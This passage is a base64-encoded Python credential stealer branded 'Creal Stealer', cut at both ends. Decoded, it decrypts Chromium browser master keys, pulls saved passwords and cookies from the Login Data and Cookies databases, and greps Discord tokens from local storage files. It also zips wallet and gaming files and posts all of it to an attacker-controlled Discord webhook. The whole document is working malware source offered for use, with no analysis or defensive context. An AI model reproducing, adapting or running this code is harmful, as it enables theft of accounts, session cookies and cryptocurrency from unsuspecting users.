AgICAgICAgICAgICAgICAibmFtZSI6ICI8YToxNjg5X1JpbmdpbmdfUGhvbmU6NzU1MjE5NDE3MDc1NDE3MDg4PiBQaG9uZToiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYGBge3BoMG4zfWBgYCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDptY19lYXJ0aDo1ODk2MzAzOTY0NzY1NTUyNjQ+IElQOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJgYGB7ZzN0MXAoKX1gYGAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6d29venlmYWNlOjg3NDIyMDg0MzUyODQ4NjkyMz4gQmFkZ2VzOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7bjF0cjB9e2I0ZGczfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPGE6NDM5NF9jY19jcmVkaXRjYXJkX2NhcnRhb19mNGJpaHk6NzU1MjE4Mjk2ODAxOTg0NTUzPiBCaWxsaW5nOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YjFsbDFuZ30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOm1hdmlraXJtaXppOjg1MzIzODM3MjU5MTU5OTYxNz4gSFEgRnJpZW5kczoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie2ZyaWVuZHN9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogRmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzM3JuNG0xfSN7aGFzaHRhZ30gKHtpZGR9KSIsCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiBmIntwZnB9IgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIkNyZWFsIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwNTA0OTI1OTMxMTQ0NTYxMjQvMTA1MTQ5MDMyMDkyMTE0NTM4NC83ODY3MTMxMDY2NTg0OTI0MTYud2VicCIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJ0aHVtYm5haWwiOiB7CiAgICAgICAgICAgICAgICAidXJsIjogZiJ7cGZwfSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIF0sCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA1MDQ5MjU5MzExNDQ1NjEyNC8xMDUxNDkwMzIwOTIxMTQ1Mzg0Lzc4NjcxMzEwNjY1ODQ5MjQxNi53ZWJwIiwKICAgICAgICAidXNlcm5hbWUiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICBMMDRkdXJsMWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQoKCmRlZiBSNGYwcm0zdChsaXN0dCk6CiAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsbGlzdHQpCiAgICB3aGlsZSAiaHR0cHMiIGluIGU6IGUucmVtb3ZlKCJodHRwcyIpCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikKICAgIHdoaWxlICJuZXQiIGluIGU6IGUucmVtb3ZlKCJuZXQiKQogICAgcmV0dXJuIGxpc3Qoc2V0KGUpKQoKZGVmIHVwbG9hZChuYW1lLCBsaW5rKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KCiAgICBpZiBuYW1lID09ICJ3cGNvb2siOgogICAgICAgIHJiID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gY29va2lXb3JkcykKICAgICAgICBpZiBsZW4ocmIpID4gMTAwMDogCiAgICAgICAgICAgIHJycnJyID0gUjRmMHJtM3Qoc3RyKGNvb2tpV29yZHMpKQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZiJ7Z2xvYmFsSW5mbygpfSIsCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgInRpdGxlIjogIkNyZWFsIHwgQ29va2llcyBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIjw6YXBvbGxvbmRlbGlybWlzOjEwMTIzNzAxODA4NDU4ODM0OTM+OiAqKkFjY291bnRzOioqXG5cbntyYn1cblxuKipEYXRhOioqXG48OmNvb2tpZXNfdGxtOjgxNjYxOTA2MzYxODU2ODIzND4g4oCiICoqe0Nvb2tpQ291bnR9KiogQ29va2llcyBGb3VuZFxuPGE6Q0hfSWNvbkFycm93UmlnaHQ6NzE1NTg1MzIwMTc4OTQxOTkzPiDigKIgW0NyZWFsQ29va2llcy50eHRdKHtsaW5rfSkiLAogICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDAwMDAwMCwKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwNTA0OTI1OTMxMTQ0NTYxMjQvMTA1MTQ5MDMyMDkyMTE0NTM4NC83ODY3MTMxMDY2NTg0OTI0MTYud2VicCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA1MDQ5MjU5MzExNDQ1NjEyNC8xMDUxNDkwMzIwOTIxMTQ1Mzg0Lzc4NjcxMzEwNjY1ODQ5MjQxNi53ZWJwIiwKICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgfQogICAgICAgIEwwNGR1cmwxYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgogICAgaWYgbmFtZSA9PSAid3BwYXNzdyI6CiAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBwYXN3V29yZHMpCiAgICAgICAgaWYgbGVuKHJhKSA+IDEwMDA6IAogICAgICAgICAgICBycnIgPSBSNGYwcm0zdChzdHIocGFzd1dvcmRzKSkKICAgICAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnIpCgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZiJ7Z2xvYmFsSW5mbygpfSIsCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgInRpdGxlIjogIkNyZWFsIHwgUGFzc3dvcmQgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiI8OmFwb2xsb25kZWxpcm1pczoxMDEyMzcwMTgwODQ1ODgzNDkzPjogKipBY2NvdW50cyoqOlxue3JhfVxuXG4qKkRhdGE6KipcbjxhOmhpcmFfa2FzYWFuYWh0YXJpOjg4Njk0Mjg1Njk2OTg3NTQ3Nj4g4oCiICoqe1A0c3N3Q291bnR9KiogUGFzc3dvcmRzIEZvdW5kXG48YTpDSF9JY29uQXJyb3dSaWdodDo3MTU1ODUzMjAxNzg5NDE5OTM+IOKAoiBbQ3JlYWxQYXNzd29yZC50eHRdKHtsaW5rfSkiLAogICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDAwMDAwMCwKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwNTA0OTI1OTMxMTQ0NTYxMjQvMTA1MTQ5MDMyMDkyMTE0NTM4NC83ODY3MTMxMDY2NTg0OTI0MTYud2VicCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJDcmVhbCIsCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwNTA0OTI1OTMxMTQ0NTYxMjQvMTA1MTQ5MDMyMDkyMTE0NTM4NC83ODY3MTMxMDY2NTg0OTI0MTYud2VicCIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMMDRkdXJsMWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKICAgIGlmIG5hbWUgPT0gImtpd2kiOgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZiJ7Z2xvYmFsSW5mbygpfSIsCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAiY29sb3IiOiAwMDAwMDAsCiAgICAgICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogbGluawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIkNyZWFsIHwgRmlsZSBTdGVhbGVyIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwNTA0OTI1OTMxMTQ0NTYxMjQvMTA1MTQ5MDMyMDkyMTE0NTM4NC83ODY3MTMxMDY2NTg0OTI0MTYud2VicCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgInVzZXJuYW1lIjogIkNyZWFsIFN0ZWFsZXIiLAogICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDUwNDkyNTkzMTE0NDU2MTI0LzEwNTE0OTAzMjA5MjExNDUzODQvNzg2NzEzMTA2NjU4NDkyNDE2LndlYnAiLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTDA0ZHVybDFiKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4KCgoKCiMgZGVmIHVwbG9hZChuYW1lLCB0az0nJyk6CiMgICAgIGhlYWRlcnMgPSB7CiMgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAojICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiMgICAgIH0KCiMgICAgICMgciA9IHJlcXVlc3RzLnBvc3QoaG9vaywgZmlsZXM9ZmlsZXMpCiMgICAgIExvYWRSZXF1ZXN0cygiUE9TVCIsIGhvb2ssIGZpbGVzPWZpbGVzKQogIyAgIF8KCgoKCmRlZiB3cjF0ZWYwcmYxbDMoZGF0YSwgbmFtZSk6CiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlx3cHtuYW1lfS50eHQiCiAgICB3aXRoIG9wZW4ocGF0aCwgbW9kZT0ndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgZi53cml0ZShmIjwtLUNyZWFsIFNURUFMRVIgQkVTVCAtLT5cblxuIikKICAgICAgICBmb3IgbGluZSBpbiBkYXRhOgogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOgogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikKClQwazNucyA9ICcnCmRlZiBnZXRUMGszbihwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoICs9IGFyZwogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxlfSIsIGVycm9ycz0iaWdub3JlIikucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyNSwxMTB9IiwgciJtZmFcLltcdy1dezgwLDk1fSIpOgogICAgICAgICAgICAgICAgICAgIGZvciB0MGszbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFQwazNucwogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaDFja1Q0azFuKHQwazNuKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0MGszbiBpbiBUMGszbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwcmludCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUMGszbnMgKz0gdDBrM24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGwwNWRUNGszMSh0MGszbiwgcGF0aCkKClA0c3N3ID0gW10KZGVmIGdldFA0c3N3KHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgUDRzc3csIFA0c3N3Q291bnQKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Mb2dpbiBEYXRhIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgIFA0c3N3LmFwcGVuZChmIlVSMToge3Jvd1swXX0gfCBVNTNSTjRNMzoge3Jvd1sxXX0gfCBQNDU1VzBSRDoge0Qza3J5cHRWNGxVMyhyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgICAgIFA0c3N3Q291bnQgKz0gMQogICAgd3IxdGVmMHJmMWwzKFA0c3N3LCAncGFzc3cnKQoKQzAwazEzID0gW10gICAgCmRlZiBnZXRDMDBrMTMocGF0aCwgYXJnKToKICAgIGdsb2JhbCBDMDBrMTMsIENvb2tpQ291bnQKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCiAgICAKICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvQ29va2llcyIKICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCiAgICAKICAgIHRlbXBmb2xkID0gdGVtcCArICJ3cCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgogICAgCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgZW5jcnlwdGVkX3ZhbHVlIEZST00gY29va2llcyIpCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkKICAgIGN1cnNvci5jbG9zZSgpCiAgICBjb25uLmNsb3NlKCkKICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkKCiAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICAKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIGNvb2tpV29yZHM6IGNvb2tpV29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgQzAwazEzLmFwcGVuZChmIntyb3dbMF19CVRSVUUJLwlGQUxTRQkyNTk3NTczNDU2CXtyb3dbMV19CXtEM2tyeXB0VjRsVTMocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgICAgICAgICBDb29raUNvdW50ICs9IDEKICAgIHdyMXRlZjByZjFsMyhDMDBrMTMsICdjb29rJykKCmRlZiBHM3REMXNjMHJkKHBhdGgsIGFyZyk6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZiJ7cGF0aH0vTG9jYWwgU3RhdGUiKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKICAgICMgcHJpbnQocGF0aCwgbWFzdGVyX2tleSkKICAgIAogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoQyk6CiAgICAgICAgIyBwcmludChwYXRoLCBmaWxlKQogICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoIi5sb2ciKSBvciBmaWxlLmVuZHN3aXRoKCIubGRiIikgICA6CiAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmIntwYXRoQ31cXHtmaWxlfSIsIGVycm9ycz0iaWdub3JlIikucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciB0MGszbiBpbiByZS5maW5kYWxsKHIiZFF3NHc5V2dYY1E6W14uKlxbJyguKiknXF0uKiRdW15cIl0qIiwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFQwazNucwogICAgICAgICAgICAgICAgICAgIHQwazNuRGVjb2RlZCA9IEQza3J5cHRWNGxVMyhiNjRkZWNvZGUodDBrM24uc3BsaXQoJ2RRdzR3OVdnWGNROicpWzFdKSwgbWFzdGVyX2tleSkKICAgICAgICAgICAgICAgICAgICBpZiBjaDFja1Q0azFuKHQwazNuRGVjb2RlZCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0MGszbkRlY29kZWQgaW4gVDBrM25zOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwcmludCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFQwazNucyArPSB0MGszbkRlY29kZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgd3JpdGVmb3JmaWxlKFRva2VucywgJ3Rva2VucycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGwwNWRUNGszMSh0MGszbkRlY29kZWQsIHBhdGgpCgpkZWYgR2F0aGVyWmlwcyhwYXRoczEsIHBhdGhzMiwgcGF0aHMzKToKICAgIHRodHRodCA9IFtdCiAgICBmb3IgcGF0dCBpbiBwYXRoczE6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVoxcFRoMW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFs1XSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgdGh0dGh0LmFwcGVuZChhKQoKICAgIGZvciBwYXR0IGluIHBhdGhzMjoKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WjFwVGgxbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdLCBwYXR0WzFdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICB0aHR0aHQuYXBwZW5kKGEpCiAgICAKICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUZWxlZ3JhbSwgYXJncz1bcGF0aHMzWzBdLCBwYXRoczNbMl0sIHBhdGhzM1sxXV0pCiAgICBhLnN0YXJ0KCkKICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICBmb3IgdGhyZWFkIGluIHRodHRodDogCiAgICAgICAgdGhyZWFkLmpvaW4oKQogICAgZ2xvYmFsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKICAgICAgICAjIHByaW50KFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXApCgogICAgd2FsLCBnYSwgb3QgPSAiIiwnJywnJwogICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOgogICAgICAgIHdhbCA9ICI6Y29pbjogIOKAoiAgV2FsbGV0c1xuIgogICAgICAgIGZvciBpIGluIFdhbGxldHNaaXA6CiAgICAgICAgICAgIHdhbCArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iCiAgICBpZiBub3QgbGVuKFdhbGxldHNaaXApID09IDA6CiAgICAgICAgZ2EgPSAiOnZpZGVvX2dhbWU6ICDigKIgIEdhbWluZzpcbiIKICAgICAgICBmb3IgaSBpbiBHYW1pbmdaaXA6CiAgICAgICAgICAgIGdhICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIKICAgIGlmIG5vdCBsZW4oT3RoZXJaaXApID09IDA6CiAgICAgICAgb3QgPSAiOnRpY2tldHM6ICDigKIgIEFwcHNcbiIKICAgICAgICBmb3IgaSBpbiBPdGhlclppcDoKICAgICAgICAgICAgb3QgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIiAgICAgICAgICAKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIAogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJ0aXRsZSI6ICJDcmVhbCBaaXBzIiwKICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiJ7d2FsfVxue2dhfVxue290fSIsCiAgICAgICAgICAgICJjb2xvciI6IDAwMDAwMCwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIkNyZWFsIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwNTA0OTI1OTMxMTQ0NTYxMjQvMTA1MTQ5MDMyMDkyMTE0NTM4NC83ODY3MTMxMDY2NTg0OTI0MTYud2VicCIKICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAidXNlcm5hbWUiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA1MDQ5MjU5MzExNDQ1